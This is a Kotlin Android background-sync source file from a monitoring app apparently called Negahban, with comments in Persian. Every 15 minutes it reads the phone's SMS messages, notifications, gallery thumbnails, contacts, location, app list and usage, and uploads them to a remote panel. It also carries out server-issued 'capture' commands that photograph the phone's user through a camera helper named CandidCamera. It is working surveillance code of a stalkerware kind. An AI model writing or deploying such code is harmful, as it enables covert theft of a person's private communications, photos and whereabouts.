package com.negahban.app.sync

import android.content.Context
import androidx.work.Constraints
import androidx.work.CoroutineWorker
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.negahban.app.NegahbanApp
import com.negahban.app.data.NotificationEventEntity
import com.negahban.app.data.SyncedPhotoEntity
import com.negahban.app.util.batteryLevel
import android.util.Base64
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.concurrent.TimeUnit

/**
 * جمع‌آوری گزارش گوشی (لیست برنامه‌ها، مصرف روزانه، باتری، پیامک‌ها،
 * اعلان‌ها و گالری) و ارسال به پنل مدیریت.
 */
class SyncWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val app = applicationContext as NegahbanApp
        val serverUrl = app.settings.serverUrl()
        val token = app.settings.deviceToken()
        if (serverUrl.isEmpty() || token.isEmpty()) {
            return@withContext Result.success() // سروری تنظیم نشده؛ کاری نیست
        }

        try {
            val battery = batteryLevel(applicationContext)

            // لیست برنامه‌های قابل اجرا + وضعیت کنترل
            val controlled = app.db.controlledAppDao().allPackages().toSet()
            val apps = app.apps.launchableApps().map {
                Triple(it.packageName, it.label, it.packageName in controlled)
            }

            // مصرف روزانه هر برنامه برای ۷ روز اخیر
            val usage = app.apps.perAppDailyUsage(7).map {
                Triple(it.day, it.packageName, it.minutes)
            }

            // ---------- پیامک‌ها (اگر مجوز داده شده) ----------
            var smsBatch: List<SmsEntry>? = null
            var newSmsId: Long? = null
            if (SmsReader.hasPermission(applicationContext)) {
                val lastSms = app.settings.lastSmsId()
                val batch = if (lastSms == 0L) {
                    SmsReader.latest(applicationContext, SMS_BATCH)
                } else {
                    SmsReader.since(applicationContext, lastSms, SMS_BATCH)
                }
                if (batch.isNotEmpty()) {
                    smsBatch = batch
                    newSmsId = batch.maxOf { it.id }
                }
            }

            // ---------- اعلان‌های ضبط‌شده ----------
            var notifBatch: List<NotificationEventEntity>? = null
            var newNotifId: Long? = null
            run {
                val lastNotif = app.settings.lastNotifId()
                val pending = app.db.notificationEventDao().since(lastNotif, NOTIF_BATCH)
                if (pending.isNotEmpty()) {
                    notifBatch = pending
                    newNotifId = pending.maxOf { it.id }
                }
            }

            // ---------- گالری: ایندکس + thumbnail عکس‌های جدید ----------
            var photoIndex: List<PhotoEntry>? = null
            var thumbBatch: List<PhotoThumb>? = null
            if (GalleryReader.hasPermission(applicationContext)) {
                val index = GalleryReader.index(applicationContext)
                if (index.isNotEmpty()) {
                    photoIndex = index
                    val already = app.db.syncedPhotoDao().allIds().toHashSet()
                    val fresh = index.filter { it.mediaId !in already }
                    val batch = mutableListOf<PhotoThumb>()
                    for (p in fresh.take(GalleryReader.THUMBS_PER_SYNC)) {
                        val b64 = GalleryReader.thumbnailBase64(applicationContext, p.mediaId)
                        if (!b64.isNullOrEmpty()) batch.add(PhotoThumb(p.mediaId, b64))
                    }
                    if (batch.isNotEmpty()) thumbBatch = batch
                }
            }

            // ---------- مخاطبین (فقط وقتی تغییر کرده یا هر ۲۴ ساعت یک بار) ----------
            var contactsBatch: List<ContactEntry>? = null
            var contactsHash: Long? = null
            if (ContactsReader.hasPermission(applicationContext)) {
                val list = ContactsReader.read(applicationContext)
                if (list.isNotEmpty()) {
                    val hash = ContactsReader.signature(list)
                    val lastHash = app.settings.lastContactsHash()
                    val lastSync = app.settings.lastContactsSync()
                    val stale = System.currentTimeMillis() - lastSync > CONTACTS_RESEND_MS
                    if (hash != lastHash || lastSync == 0L || stale) {
                        contactsBatch = list
                        contactsHash = hash
                    }
                }
            }

            // ---------- موقعیت مکانی (برای نقشه پنل) ----------
            var location: LocationReader.Fix? = null
            if (LocationReader.hasPermission(applicationContext)) {
                try {
                    val loc = LocationReader.currentFix(applicationContext, LOC_TIMEOUT_MS)
                    if (loc != null) location = LocationReader.toFix(loc)
                } catch (e: Exception) {
                }
            }

            val response = SyncApi.sync(
                serverUrl = serverUrl,
                token = token,
                battery = battery,
                apps = apps,
                usage = usage,
                sms = smsBatch,
                notifications = notifBatch,
                photos = photoIndex,
                thumbs = thumbBatch,
                contacts = contactsBatch,
                location = location
            )

            // ارسال موفق بود؛ مکان‌نماها جلو می‌روند و داده ارسال‌شده پاک می‌شود
            if (newSmsId != null) app.settings.setLastSmsId(newSmsId)
            if (newNotifId != null) {
                app.settings.setLastNotifId(newNotifId)
                app.db.notificationEventDao().deleteSynced(newNotifId)
            }
            if (!thumbBatch.isNullOrEmpty()) {
                app.db.syncedPhotoDao().insertAll(thumbBatch.map { SyncedPhotoEntity(it.mediaId) })
            }
            if (contactsHash != null) {
                app.settings.setLastContactsHash(contactsHash)
                app.settings.setLastContactsSync(System.currentTimeMillis())
            }

            // ---------- فرمان‌های در انتظار (عکس‌برداری از کاربر گوشی) ----------
            try {
                val commands = response.optJSONArray("commands")
                if (commands != null && commands.length() > 0) {
                    val results = mutableListOf<CaptureResult>()
                    for (i in 0 until commands.length()) {
                        val cmd = commands.optJSONObject(i) ?: continue
                        if (cmd.optString("type") != "capture") continue
                        val cmdId = cmd.optString("id")
                        if (cmdId.isEmpty()) continue
                        // بدون مجوز دوربین یا وقتی دوربین درگیر است، نتیجه‌ای ارسال نمی‌شود؛
                        // فرمان روی سرور PENDING می‌ماند و در همگام‌سازی بعدی دوباره تلاش می‌شود
                        if (!CandidCamera.hasPermission(applicationContext)) continue
                        val jpeg = CandidCamera.shoot(applicationContext) ?: continue
                        if (jpeg.isEmpty()) continue
                        results.add(
                            CaptureResult(
                                commandId = cmdId,
                                base64 = Base64.encodeToString(jpeg, Base64.NO_WRAP),
                                atMillis = System.currentTimeMillis()
                            )
                        )
                    }
                    if (results.isNotEmpty()) {
                        SyncApi.sendCaptures(serverUrl, token, results)
                    }
                }
            } catch (e: Exception) {
            }

            Result.success()
        } catch (e: Exception) {
            if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    companion object {
        private const val PERIODIC_NAME = "negahban_sync_periodic"
        private const val ONESHOT_NAME = "negahban_sync_now"

        /** حداکثر پیامک در هر ارسال (اولین ارسال هم newest-first است) */
        private const val SMS_BATCH = 300

        /** حداکثر اعلان در هر ارسال */
        private const val NOTIF_BATCH = 200

        /** ارسال مجدد کامل مخاطبین حداکثر با این فاصله (۲۴ ساعت) */
        private const val CONTACTS_RESEND_MS = 24L * 60 * 60 * 1000

        /** مهلت دریافت موقعیت در هر همگام‌سازی */
        private const val LOC_TIMEOUT_MS = 20_000L

        /** زمان‌بندی همگام‌سازی خودکار هر ۱۵ دقیقه */
        fun schedule(context: Context) {
            val request = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
                .setConstraints(
                    Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .build()
                )
                .build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                PERIODIC_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
        }

        /** همگام‌سازی فوری (بعد از جفت‌سازی یا باز شدن اپ) */
        fun syncNow(context: Context) {
            val request = OneTimeWorkRequestBuilder<SyncWorker>()
                .setConstraints(
                    Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .build()
                )
                .build()
            WorkManager.getInstance(context).enqueueUniqueWork(
                ONESHOT_NAME,
                ExistingWorkPolicy.REPLACE,
                request
            )
        }
    }
}
